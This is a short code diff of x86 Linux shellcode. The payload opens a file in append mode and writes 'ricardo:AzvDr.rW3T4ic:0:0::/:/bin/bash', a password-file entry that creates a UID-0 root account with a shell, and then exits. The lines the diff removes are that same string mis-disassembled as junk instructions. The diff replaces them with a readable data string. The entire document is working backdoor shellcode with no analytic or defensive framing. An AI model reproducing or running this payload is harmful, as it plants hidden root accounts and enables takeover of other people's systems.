@@ -9,7 +9,6 @@ _start:
 	pop eax
 	int 0x80
 
-syscall2:
 	push byte +0x5
 	pop eax
 	xor ecx,ecx
@@ -22,32 +21,17 @@ syscall2:
 	mov ch,0x4
 	int 0x80
 
-syscall3:
 	xchg eax,ebx
-	call 0x52
-	jc 0x96
-	arpl [ecx+0x72],sp
-	fs outsd
-	cmp al,[ecx+0x7a]
-	jna 0x7b
-	jc 0x67
-	jc 0x92
-	xor edx,[esp+esi+0x69]
-	arpl [edx],di
-	xor [edx],bh
-	xor [edx],bh
-	cmp ch,[edi]
-	cmp ch,[edi]
-	bound ebp,[ecx+0x6e]
-	das
-	bound esp,[ecx+0x73]
-	push dword 0x518b590a
-	cld
-	push byte +0x4
+	call adduser
+
+	String: db "ricardo:AzvDr.rW3T4ic:0:0::/:/bin/bash",
+
+adduser:
+	pop ecx
+	mov edx,DWORD [ecx-0x4]
+	push 0x4
 	pop eax
 	int 0x80
-
-syscall4:
 	push byte +0x1
 	pop eax
 	int 0x80
